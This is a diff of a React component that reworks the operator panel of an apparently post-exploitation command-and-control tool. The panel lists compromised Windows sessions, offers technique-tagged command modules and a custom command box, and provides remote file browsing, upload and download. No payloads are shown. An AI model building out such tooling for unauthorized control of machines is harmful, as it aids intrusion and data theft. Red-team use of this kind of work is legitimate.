-          {selected && (
-            <div className="mt-auto pt-2 border-t border-border flex flex-col gap-1">
-              <button onClick={() => onOpenTerminal(selected.id, selected.name)}
-                className="w-full flex items-center justify-center gap-1.5 py-1.5 rounded border border-primary/40 text-primary hover:bg-primary/10 transition-colors text-[11px]">
-                <Terminal size={11} /> Open Shell
-              </button>
-              <button onClick={() => { setActiveTab('files'); browseFs('C:\\Users') }}
-                className="w-full flex items-center justify-center gap-1.5 py-1.5 rounded border border-border text-muted hover:border-muted hover:text-text transition-colors text-[11px]">
-                <FolderOpen size={11} /> Browse Files
-              </button>
-            </div>
-          )}
+      {/* ══ COL 1 — Session List ══════════════════════════════════════════════ */}
+      <aside className="w-48 shrink-0 flex flex-col border-r border-border" style={{ background: '#090909' }}>
+
+        <div className="flex items-center justify-between px-3 py-2.5 border-b border-border">
+          <span className="text-[10px] font-bold tracking-widest text-muted uppercase">Windows</span>
+          <button onClick={refresh} className="text-muted hover:text-primary transition-colors" title="Refresh">
+            <RefreshCw size={11} className={loading ? 'animate-spin' : ''} />
+          </button>
         </div>
 
-        {/* Right: capabilities */}
-        {!selected ? (
-          <div className="flex-1 flex items-center justify-center border border-dashed border-border rounded-lg">
-            <div className="text-center">
-              <Monitor size={32} className="text-muted mx-auto mb-2" />
-              <p className="text-muted text-sm">Select a Windows device</p>
+        <div className="flex-1 overflow-y-auto">
+          {!loading && sessions.length === 0 && (
+            <div className="p-4 text-center space-y-1">
+              <Monitor size={20} className="text-border mx-auto" />
+              <p className="text-muted text-[10px]">No Windows sessions</p>
+            </div>
+          )}
+          {sessions.map(s => {
+            const active = s.id === selId
+            return (
+              <button key={s.id}
+                onClick={() => selectSession(s.id)}
+                className={`w-full text-left px-3 py-2.5 border-b border-border/20 transition-all group ${
+                  active ? 'bg-primary/8 border-l-2 border-l-primary' : 'hover:bg-white/4'
+                }`}>
+                <div className="flex items-center gap-1.5 mb-1">
+                  <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${active ? 'bg-primary' : 'bg-muted'}`} />
+                  <span className={`text-[11px] font-semibold truncate ${active ? 'text-text' : 'text-muted group-hover:text-text'}`}>
+                    {s.hostname}
+                  </span>
+                </div>
+                <div className="pl-3 space-y-0.5">
+                  <div className="text-[9px] text-muted truncate">{s.username}</div>
+                  <div className="text-[9px] text-muted truncate">{s.remote_address}</div>
+                  <div className={`text-[9px] truncate ${active ? 'text-primary/70' : 'text-muted/60'}`}>{s.os} · {s.arch}</div>
+                </div>
+              </button>
+            )
+          })}
+        </div>
+
+        {error && <p className="px-2 py-1 text-[9px] text-danger">{error}</p>}
+      </aside>
+
+      {/* ══ COL 2 — Command Palette ══════════════════════════════════════════ */}
+      {selId && (
+        <div className="w-56 shrink-0 flex flex-col border-r border-border" style={{ background: '#0b0b0b' }}>
+
+          {/* Target info */}
+          <div className="px-3 py-2 border-b border-border">
+            <div className="flex items-center justify-between">
+              <span className="text-[9px] font-bold text-primary tracking-widest uppercase">Target</span>
+              <button onClick={() => onOpenTerminal(selId, sel?.name || sel?.hostname || '')}
+                className="flex items-center gap-1 text-muted hover:text-primary text-[9px] transition-colors">
+                <Terminal size={9} /> Shell
+              </button>
+            </div>
+            <div className="text-[10px] text-text font-semibold mt-0.5 truncate">{sel?.hostname}</div>
+            <div className="text-[9px] text-muted truncate">{sel?.username} · {sel?.remote_address}</div>
+          </div>
+
+          {/* Search */}
+          <div className="px-2 py-1.5 border-b border-border">
+            <div className="flex items-center gap-1.5 bg-bg/60 border border-border rounded px-2 py-1">
+              <Search size={10} className="text-muted shrink-0" />
+              <input
+                value={search}
+                onChange={e => setSearch(e.target.value)}
+                placeholder="filter modules…"
+                className="flex-1 bg-transparent text-[10px] text-text placeholder-muted/60 outline-none min-w-0"
+              />
+              {search && (
+                <button onClick={() => setSearch('')} className="text-muted hover:text-text shrink-0">
+                  <X size={9} />
+                </button>
+              )}
             </div>
           </div>
-        ) : (
-          <div className="flex-1 flex flex-col gap-2 min-h-0">
-            {/* Device info */}
-            <div className="bg-surface border border-primary/20 rounded-lg px-3 py-2 shrink-0 flex items-center gap-3 flex-wrap">
-              <span className="w-2 h-2 rounded-full bg-primary animate-pulse" />
-              <span className="text-text font-bold text-sm">{selected.name}</span>
-              <span className="text-muted text-[10px] font-mono">{selected.id.slice(0,8)}</span>
-              <span className="text-muted text-[10px] bg-surface border border-border px-1.5 py-0.5 rounded">{selected.transport}</span>
-              <span className="text-muted text-[10px] ml-auto">{selected.username}@{selected.hostname} · PID {selected.pid}</span>
-            </div>
 
-            {/* Tab bar */}
-            <div className="flex gap-0.5 overflow-x-auto shrink-0 bg-surface border border-border rounded-lg p-1">
-              {TABS_WIN.map(t => (
-                <button key={t.id} onClick={() => setActiveTab(t.id)}
-                  className={`px-2.5 py-1.5 rounded text-[10px] whitespace-nowrap transition-colors ${activeTab === t.id ? 'bg-primary/20 text-primary font-semibold' : 'text-muted hover:text-text hover:bg-border/30'}`}>
-                  {t.label}
-                </button>
-              ))}
-            </div>
+          {/* Category accordion */}
+          <div className="flex-1 overflow-y-auto">
+            {filteredCats.map(cat => {
+              const open = openCats.has(cat.id) || !!search.trim()
+              return (
+                <div key={cat.id}>
+                  <button
+                    onClick={() => !search.trim() && toggleCat(cat.id)}
+                    className="w-full flex items-center gap-1.5 px-3 py-1.5 hover:bg-white/4 transition-colors group">
+                    <span className="text-xs">{cat.icon}</span>
+                    <span className="flex-1 text-[9px] font-bold tracking-widest text-muted group-hover:text-text uppercase text-left">{cat.label}</span>
+                    <span className="text-[8px] text-muted/60 font-mono">{cat.atkId}</span>
+                    {open
+                      ? <ChevronDown size={9} className="text-muted shrink-0" />
+                      : <ChevronRight size={9} className="text-muted shrink-0" />}
+                  </button>
 
-            {/* Capabilities */}
-            <div className="flex-1 min-h-0 overflow-y-auto">
-              {activeTab !== 'files' && (
-                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-1.5 p-1">
-                  {CAP[activeTab].map(c => (
-                    <button key={c.l} onClick={() => exec(c.c, c.l)} disabled={executing}
-                      className="flex items-start gap-2 px-2.5 py-2 rounded border border-border bg-surface hover:border-primary/40 hover:bg-primary/5 transition-colors disabled:opacity-40 text-left">
-                      <span className="text-sm shrink-0 mt-0.5">{c.icon}</span>
-                      <span className="text-[10px] text-muted leading-tight">{c.l}</span>
+                  {open && cat.cmds.map(c => (
+                    <button key={c.label}
+                      disabled={running}
+                      onClick={() => exec(c.cmd, c.label)}
+                      className="w-full flex items-center gap-2 px-4 py-1.5 hover:bg-primary/8 transition-colors group disabled:opacity-40 text-left">
+                      <span className="text-[11px] shrink-0">{c.icon}</span>
+                      <span className="flex-1 text-[10px] text-muted group-hover:text-text transition-colors truncate">{c.label}</span>
+                      {c.tag && <span className="text-[8px] text-muted/40 font-mono shrink-0">{c.tag}</span>}
                     </button>
                   ))}
                 </div>
-              )}
+              )
+            })}
+          </div>
 
-              {activeTab === 'files' && (
-                <div className="flex flex-col gap-2 p-1">
-                  <div className="flex items-center gap-2">
-                    <input value={fsPath} onChange={e => setFsPath(e.target.value)}
-                      onKeyDown={e => e.key === 'Enter' && browseFs(fsPath)}
-                      className="flex-1 bg-bg border border-border rounded px-2 py-1.5 text-[11px] font-mono text-text focus:border-primary outline-none" />
-                    <button onClick={() => browseFs(fsPath)} disabled={fsLoading}
-                      className="px-3 py-1.5 rounded bg-primary/10 border border-primary/40 text-primary text-[11px] disabled:opacity-40">
-                      {fsLoading ? <Loader size={11} className="animate-spin" /> : 'Go'}
-                    </button>
-                    {/* Quick paths */}
-                    {['C:\\', 'C:\\Users', 'C:\\Windows\\Temp', 'C:\\inetpub'].map(p => (
-                      <button key={p} onClick={() => { setFsPath(p); browseFs(p) }}
-                        className="px-2 py-1.5 rounded border border-border text-muted text-[9px] hover:border-primary hover:text-primary transition-colors whitespace-nowrap">
-                        {p.split('\\').pop() || p}
-                      </button>
-                    ))}
-                    <input ref={uploadRef} type="file" className="hidden"
-                      onChange={e => e.target.files?.[0] && uploadFile(e.target.files[0])} />
-                    <button onClick={() => uploadRef.current?.click()} disabled={uploading}
-                      className="px-2 py-1.5 rounded border border-border text-muted text-[11px] flex items-center gap-1 hover:border-muted disabled:opacity-40">
-                      <Upload size={10} /> {uploading ? '…' : 'Upload'}
-                    </button>
-                  </div>
-                  {uploadMsg && <div className={`text-[10px] px-2 ${uploadMsg.startsWith('✓') ? 'text-primary' : 'text-danger'}`}>{uploadMsg}</div>}
-                  {fsData && (
-                    <div className="border border-border rounded-lg overflow-hidden max-h-64 overflow-y-auto">
-                      <button onClick={() => { const p = fsPath.replace(/[/\\]+$/, '').replace(/\\[^\\]+$/, '') || 'C:\\'; browseFs(p) }}
-                        className="w-full flex items-center gap-2 px-3 py-1.5 hover:bg-border/20 border-b border-border/40 text-[11px] text-muted">
-                        ⬆ ..
-                      </button>
-                      {fsData.files.filter(f => f.name !== '.' && f.name !== '..').map(f => (
-                        <div key={f.name} className="flex items-center gap-2 px-3 py-1.5 hover:bg-border/20 border-b border-border/20 text-[11px]">
-                          <span>{f.is_dir ? '📁' : '📄'}</span>
-                          <button onClick={() => f.is_dir ? browseFs(joinWin(fsPath, f.name)) : void 0}
-                            className={`flex-1 font-mono text-left truncate ${f.is_dir ? 'text-accent hover:text-primary cursor-pointer' : 'text-text'}`}>
-                            {f.name}
-                          </button>
-                          <span className="text-[9px] text-muted shrink-0">{f.is_dir ? 'dir' : fmtBytes(f.size)}</span>
-                          {!f.is_dir && (
-                            <button onClick={() => downloadFile(joinWin(fsPath, f.name))} title="Download"
-                              className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[9px] border border-primary/30 text-primary hover:bg-primary/10 transition-colors shrink-0">
-                              <Download size={9} /> DL
-                            </button>
-                          )}
-                        </div>
-                      ))}
-                    </div>
-                  )}
-                </div>
-              )}
-            </div>
-
-            {/* Custom command */}
-            <div className="flex gap-2 shrink-0">
-              <input value={customCmd} onChange={e => setCustomCmd(e.target.value)}
-                onKeyDown={e => { if (e.key === 'Enter' && customCmd.trim()) { exec(customCmd); setCustomCmd('') } }}
-                disabled={executing}
-                placeholder="Custom command (cmd.exe /c, powershell -c, etc.)…"
-                className="flex-1 bg-bg border border-border rounded px-3 py-2 text-xs font-mono text-text placeholder-muted focus:border-primary outline-none" />
-              <button onClick={() => { if (customCmd.trim()) { exec(customCmd); setCustomCmd('') } }}
-                disabled={executing || !customCmd.trim()}
-                className="px-3 py-2 rounded bg-primary/10 border border-primary/40 text-primary hover:bg-primary/20 disabled:opacity-40">
-                {executing ? <Loader size={13} className="animate-spin" /> : <Send size={13} />}
+          {/* Custom command + file browser */}
+          <div className="shrink-0 border-t border-border">
+            <div className="flex items-center gap-1.5 px-2.5 py-2 border-b border-border/50">
+              <span className="text-muted text-[10px] font-bold select-none shrink-0">C:\&gt;</span>
+              <input
+                value={custom}
+                onChange={e => setCustom(e.target.value)}
+                onKeyDown={e => { if (e.key === 'Enter' && custom.trim()) { exec(custom.trim(), custom.trim()); setCustom('') } }}
+                placeholder="custom command…"
+                className="flex-1 bg-transparent text-[10px] text-text placeholder-muted/50 outline-none font-mono min-w-0"
+              />
+              <button
+                onClick={() => { if (custom.trim()) { exec(custom.trim(), custom.trim()); setCustom('') } }}
+                disabled={running || !custom.trim()}
+                className="text-muted hover:text-primary disabled:opacity-30 shrink-0">
+                {running ? <Loader size={10} className="animate-spin" /> : <Send size={10} />}
               </button>
             </div>
-
-            {/* Output */}
-            {outputs.length > 0 && (
-              <div className="shrink-0 border border-border rounded-lg overflow-hidden bg-bg" style={{ maxHeight: 200 }}>
-                <div className="flex items-center justify-between px-3 py-1.5 bg-surface border-b border-border text-[10px]">
-                  <div className="flex items-center gap-2">
-                    <Activity size={10} className="text-primary" />
-                    <span className={outputs[0].ok ? 'text-primary' : 'text-danger'}>{outputs[0].ok ? '✓' : '✗'}</span>
-                    <span className="text-muted font-mono truncate max-w-[300px]">{outputs[0].cmd}</span>
-                  </div>
-                  <div className="flex items-center gap-1.5">
-                    <button onClick={() => { navigator.clipboard.writeText(outputs[0].result); setCopied(true); setTimeout(() => setCopied(false), 1500) }}>
-                      {copied ? <CheckCheck size={11} className="text-primary" /> : <Copy size={11} className="text-muted hover:text-text" />}
-                    </button>
-                    <button onClick={() => setOutputs([])}><X size={11} className="text-muted hover:text-danger" /></button>
-                  </div>
-                </div>
-                <pre className="px-3 py-2 text-[11px] font-mono text-text whitespace-pre-wrap break-all overflow-y-auto" style={{ maxHeight: 160 }}>
-                  {outputs[0].result}
-                </pre>
-              </div>
-            )}
+            <button
+              onClick={() => { setShowFs(true); if (!fsData) browseFs(fsPath) }}
+              className={`w-full flex items-center gap-2 px-3 py-2 text-[10px] transition-colors ${
+                showFs ? 'bg-primary/10 text-primary' : 'text-muted hover:text-text hover:bg-white/4'
+              }`}>
+              <FolderOpen size={11} />
+              File Browser
+            </button>
           </div>
-        )}
-      </div>
+        </div>
+      )}
+
+      {/* ══ COL 3 — Task Output / File Browser ══════════════════════════════ */}
+      {selId ? (
+        <div className="flex-1 flex flex-col min-w-0 min-h-0">
+
+          {showFs ? (
+            /* ── File Browser ──────────────────────────────────────────────── */
+            <div className="flex-1 flex flex-col min-h-0">
+              <div className="shrink-0 flex items-center gap-2 px-3 py-2 border-b border-border bg-surface/40">
+                <FolderOpen size={11} className="text-primary shrink-0" />
+                <span className="text-[10px] text-muted font-mono flex-1 truncate">{fsPath}</span>
+                <button onClick={() => browseFs(parentWin(fsPath))} className="text-muted hover:text-text text-[10px] flex items-center gap-1 shrink-0">
+                  <ChevronRight size={10} className="rotate-180" /> Up
+                </button>
+                <button onClick={() => browseFs(fsPath)} className="text-muted hover:text-primary shrink-0">
+                  <RefreshCw size={10} className={fsLoading ? 'animate-spin' : ''} />
+                </button>
+                <button onClick={() => uploadRef.current?.click()} className="text-muted hover:text-primary shrink-0" title="Upload">
+                  <Upload size={10} />
+                </button>
+                <button onClick={() => setShowFs(false)} className="text-muted hover:text-text shrink-0">
+                  <X size={10} />
+                </button>
+                <input ref={uploadRef} type="file" className="hidden" onChange={e => e.target.files?.[0] && uploadFile(e.target.files[0])} />
+              </div>
+              <div className="flex-1 overflow-y-auto text-[11px]">
+                {fsLoading
+                  ? <div className="flex items-center justify-center p-8"><Loader size={16} className="text-muted animate-spin" /></div>
+                  : fsFiles.length === 0
+                  ? <div className="p-4 text-muted text-center text-xs">Empty directory</div>
+                  : fsFiles.map(f => (
+                  <div key={f.name} className="flex items-center gap-2 px-3 py-1.5 border-b border-border/20 hover:bg-white/3 group">
+                    <span className="shrink-0">{f.is_dir ? '📁' : '📄'}</span>
+                    <button
+                      onClick={() => f.is_dir && browseFs(joinWin(fsPath, f.name))}
+                      className={`flex-1 text-left truncate text-[10px] ${f.is_dir ? 'text-accent hover:text-primary cursor-pointer' : 'text-text cursor-default'}`}>
+                      {f.name}
+                    </button>
+                    {!f.is_dir && <span className="text-[9px] text-muted shrink-0 tabular-nums">{fmtBytes(f.size)}</span>}
+                    {!f.is_dir && (
+                      <button onClick={() => downloadFile(joinWin(fsPath, f.name))}
+                        className="text-muted hover:text-primary opacity-0 group-hover:opacity-100 transition-all shrink-0" title="Download">
+                        <Download size={10} />
+                      </button>
+                    )}
+                  </div>
+                ))}
+              </div>
+            </div>
+          ) : (
+            /* ── Task History ──────────────────────────────────────────────── */
+            <div className="flex-1 flex flex-col min-h-0">
+              <div className="shrink-0 flex items-center justify-between px-4 py-2 border-b border-border bg-surface/30">
+                <div className="flex items-center gap-2">
+                  <Hash size={11} className="text-muted" />
+                  <span className="text-[10px] text-muted font-semibold uppercase tracking-wider">Task History</span>
+                  {tasks.length > 0 && (
+                    <span className="text-[9px] bg-border/60 text-muted px-1.5 py-0.5 rounded-full">{tasks.length}</span>
+                  )}
+                  {running && <Loader size={10} className="text-primary animate-spin" />}
+                </div>
+                {tasks.length > 0 && (
+                  <button onClick={() => setTasks([])} className="text-[9px] text-muted hover:text-danger transition-colors">
+                    Clear
+                  </button>
+                )}
+              </div>
+
+              <div className="flex-1 overflow-y-auto p-3 space-y-2">
+                {tasks.length === 0 ? (
+                  <div className="flex flex-col items-center justify-center h-full gap-3 text-center py-16">
+                    <div className="w-10 h-10 rounded-full border border-border flex items-center justify-center">
+                      <Terminal size={18} className="text-border" />
+                    </div>
+                    <div className="text-muted text-xs">No tasks yet</div>
+                    <div className="text-muted/60 text-[10px] max-w-xs">
+                      Select a module from the command palette or type a custom command
+                    </div>
+                  </div>
+                ) : tasks.map((t, i) => (
+                  <div key={t.id} className={`border rounded overflow-hidden transition-all ${
+                    t.ok ? 'border-border/60' : 'border-danger/30'
+                  }`}>
+                    {/* Task header */}
+                    <button
+                      onClick={() => toggleTask(t.id)}
+                      className={`w-full flex items-center gap-2.5 px-3 py-2 text-left transition-colors ${
+                        t.ok ? 'bg-surface/60 hover:bg-surface' : 'bg-danger/5 hover:bg-danger/8'
+                      }`}>
+                      <span className="text-[9px] text-muted/50 font-mono shrink-0 tabular-nums">
+                        #{String(tasks.length - i).padStart(2, '0')}
+                      </span>
+                      <span className={`shrink-0 rounded px-1.5 py-0.5 text-[8px] font-bold tracking-wider ${
+                        t.ok ? 'bg-primary/15 text-primary' : 'bg-danger/20 text-danger'
+                      }`}>
+                        {t.ok ? 'SUCCESS' : 'ERROR'}
+                      </span>
+                      <span className="flex-1 text-[10px] text-text font-semibold truncate">{t.cmd}</span>
+                      <span className="text-[9px] text-muted shrink-0 tabular-nums">
+                        {new Date(t.ts).toLocaleTimeString()}
+                      </span>
+                      <button
+                        onClick={e => { e.stopPropagation(); copy(t.id, t.result) }}
+                        className="text-muted hover:text-primary shrink-0 transition-colors">
+                        {copied === t.id ? <CheckCheck size={10} /> : <Copy size={10} />}
+                      </button>
+                      {t.open
+                        ? <ChevronDown size={10} className="text-muted shrink-0" />
+                        : <ChevronRight size={10} className="text-muted shrink-0" />}
+                    </button>
+
+                    {/* Output */}
+                    {t.open && (
+                      <pre className="px-4 py-3 text-[10px] text-text/90 whitespace-pre-wrap break-all leading-relaxed max-h-72 overflow-y-auto bg-bg/80 border-t border-border/30">
+                        {t.result}
+                      </pre>
+                    )}
+                  </div>
+                ))}
+              </div>
+            </div>
+          )}
+        </div>
+      ) : (
+        /* ── No session selected ─────────────────────────────────────────── */
+        <div className="flex-1 flex flex-col items-center justify-center gap-4 p-8 text-center">
+          <div className="w-14 h-14 rounded-full border border-border flex items-center justify-center">
+            <Monitor size={24} className="text-border" />
+          </div>
+          <div>
+            <div className="text-muted text-sm font-semibold mb-1">No session selected</div>
+            <div className="text-muted/60 text-xs max-w-xs leading-relaxed">
+              Select a Windows target from the session list to begin post-exploitation
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
